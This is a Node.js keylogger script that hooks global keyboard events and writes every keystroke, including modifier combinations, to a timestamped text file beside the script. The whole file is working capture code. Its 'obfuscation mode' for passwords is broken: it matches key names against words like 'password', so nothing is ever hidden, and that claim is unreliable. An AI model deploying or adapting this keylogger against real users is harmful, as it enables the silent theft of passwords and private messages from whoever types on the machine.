'use strict';

const fs = require('fs');
const path = require('path');
const { GlobalKeyboardListener } = require('node-global-key-listener');

// Create a new instance of the listener
const keyboardListener = new GlobalKeyboardListener();

// Get current date and time for the filename
const now = new Date();
const formattedDate = new Intl.DateTimeFormat('en-GB').format(now).split('/').join('-');
const formattedTime = `${now.getHours()}-${now.getMinutes()}-${now.getSeconds()}`;
const fileName = `keystrokes-${formattedDate}-${formattedTime}.txt`;
const outputPath = path.join(__dirname, fileName);

// Create a write stream for the output file with error handling
const outputStream = fs.createWriteStream(outputPath, { flags: 'a' });
outputStream.on('error', (err) => {
  console.error('Failed to write to the file:', err.message);
});

// Mapping of special key names to their formatted representation
const specialKeys = {
    // Modifier Keys
    'enter': '[ENTER]',
    'alt': '[ALT]',
    'shift': '[SHIFT]',
    'ctrl': '[CTRL]',
    'caps': '[CAPS_LOCK]',
    'tab': '[TAB]',
    'fn': '[FN]',
    'esc': '[ESC]',
    
    // Space & Navigation
    'space': '[SPACE]',
    'backspace': '[BACKSPACE]',
    'delete': '[DELETE]',
    'insert': '[INSERT]',
    'home': '[HOME]',
    'end': '[END]',
    'pageup': '[PAGE_UP]',
    'pagedown': '[PAGE_DOWN]',
    'arrowup': '[UP_ARROW]',
    'arrowdown': '[DOWN_ARROW]',
    'arrowleft': '[LEFT_ARROW]',
    'arrowright': '[RIGHT_ARROW]',
    
    // Function Keys
    'f1': '[F1]',
    'f2': '[F2]',
    'f3': '[F3]',
    'f4': '[F4]',
    'f5': '[F5]',
    'f6': '[F6]',
    'f7': '[F7]',
    'f8': '[F8]',
    'f9': '[F9]',
    'f10': '[F10]',
    'f11': '[F11]',
    'f12': '[F12]',
    
    // Numeric Keypad
    'numlock': '[NUM_LOCK]',
    'numpad0': '[NUMPAD_0]',
    'numpad1': '[NUMPAD_1]',
    'numpad2': '[NUMPAD_2]',
    'numpad3': '[NUMPAD_3]',
    'numpad4': '[NUMPAD_4]',
    'numpad5': '[NUMPAD_5]',
    'numpad6': '[NUMPAD_6]',
    'numpad7': '[NUMPAD_7]',
    'numpad8': '[NUMPAD_8]',
    'numpad9': '[NUMPAD_9]',
    'numpadadd': '[NUMPAD_ADD]',
    'numpadsubtract': '[NUMPAD_SUBTRACT]',
    'numpadmultiply': '[NUMPAD_MULTIPLY]',
    'numpaddivide': '[NUMPAD_DIVIDE]',
    'numpadenter': '[NUMPAD_ENTER]',
    'numpaddecimal': '[NUMPAD_DECIMAL]',
    
    // Symbols and Punctuation
    'backquote': '[GRAVE_ACCENT]',
    'minus': '[HYPHEN]',
    'equal': '[EQUALS]',
    'bracketleft': '[LEFT_BRACKET]',
    'bracketright': '[RIGHT_BRACKET]',
    'semicolon': '[SEMICOLON]',
    'quote': '[APOSTROPHE]',
    'comma': '[COMMA]',
    'period': '[PERIOD]',
    'slash': '[FORWARD_SLASH]',
    'backslash': '[BACKSLASH]',
    
    // System Keys
    'printscreen': '[PRINT_SCREEN]',
    'scrolllock': '[SCROLL_LOCK]',
    'pause': '[PAUSE]',
    
    // Multimedia Keys (on some keyboards)
    'volumeup': '[VOLUME_UP]',
    'volumedown': '[VOLUME_DOWN]',
    'volumemute': '[MUTE]',
    'playpause': '[PLAY_PAUSE]',
    'stop': '[STOP]',
    'nexttrack': '[NEXT_TRACK]',
    'prevtrack': '[PREVIOUS_TRACK]',
    
    // Browser/OS Keys
    'browserback': '[BROWSER_BACK]',
    'browserforward': '[BROWSER_FORWARD]',
    'browserrefresh': '[BROWSER_REFRESH]',
    'browserhome': '[BROWSER_HOME]',
    
    // Power Keys
    'power': '[POWER]',
    'sleep': '[SLEEP]',
    'wake': '[WAKE]',
  };
  

// Function to determine if a character is alphanumeric
function isAlphanumeric(char) {
  return /^[0-9a-zA-Z]+$/.test(char);
}

// Handle key combinations (e.g., Ctrl+Shift+T)
let modifierKeys = {
  'shift': false,
  'ctrl': false,
  'alt': false,
};

// Event listener for key presses
keyboardListener.addListener((event) => {
  if (event.state === 'DOWN') {
    let formattedKey = '';

    // Check for modifier key combinations
    if (event.name.toLowerCase() in modifierKeys) {
      modifierKeys[event.name.toLowerCase()] = true;
      return;
    }

    // Special keys handling
    if (specialKeys[event.name.toLowerCase()]) {
      formattedKey = specialKeys[event.name.toLowerCase()];
    } else if (isAlphanumeric(event.name)) {
      formattedKey = event.name;
    } else {
      formattedKey = `<${event.name}>`; // For non-alphanumeric/special chars
    }

    // Log modifier key combinations
    const activeModifiers = Object.keys(modifierKeys).filter(key => modifierKeys[key]);
    if (activeModifiers.length > 0) {
      formattedKey = `[${activeModifiers.join('+').toUpperCase()}+${formattedKey}]`;
    }

    // Write the formatted keystroke to the file
    outputStream.write(formattedKey + '\n');

    // Reset modifier keys after the combination is logged
    Object.keys(modifierKeys).forEach(key => modifierKeys[key] = false);
  }
});

// Obfuscation mode (useful for sensitive data like passwords)
const obfuscationMode = false; // Set to true to obfuscate keys
if (obfuscationMode) {
  console.log("Obfuscation mode is enabled. Sensitive keys will be hidden.");
  keyboardListener.addListener((event) => {
    if (event.state === 'DOWN') {
      const isSensitive = ['password', 'login', 'secret'].some(word => event.name.toLowerCase().includes(word));
      if (isSensitive) {
        outputStream.write('[OBFUSCATED]\n');
      }
    }
  });
}

// Print initial message to indicate recording is active
console.log(`\n\nRecording keystrokes... \nPress CTRL + C to stop. \nOutput file: ${fileName}`);

// Handle process exit to ensure the output file is properly closed
process.on('exit', () => {
  outputStream.end();
  console.log('Keystroke recording stopped and file saved.');
});

process.on('SIGINT', () => {
  console.log('Terminating the keylogger...');
  process.exit();
});
